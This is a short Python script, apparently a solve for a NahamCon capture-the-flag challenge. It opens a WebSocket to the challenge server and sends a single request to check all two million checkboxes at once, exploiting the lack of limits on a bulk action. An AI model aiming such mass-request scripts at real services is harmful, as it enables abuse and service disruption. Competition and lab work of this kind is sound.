import asyncio
import websockets
import json

HOST = "challenge.nahamcon.com"
PORT = 31020
WS_URL = f"ws://{HOST}:{PORT}/ws"

TOTAL_CHECKBOXES = 2_000_000


async def check_all_boxes():
    async with websockets.connect(WS_URL) as ws:
        print("[*] Connected to WebSocket server.")
        # Send all checkboxes at once
        all_checkboxes = list(range(TOTAL_CHECKBOXES))
        await ws.send(json.dumps({"action": "check", "numbers": all_checkboxes}))
        print(f"[+] Sent check request for all {TOTAL_CHECKBOXES} checkboxes")


# Run it
asyncio.run(check_all_boxes())
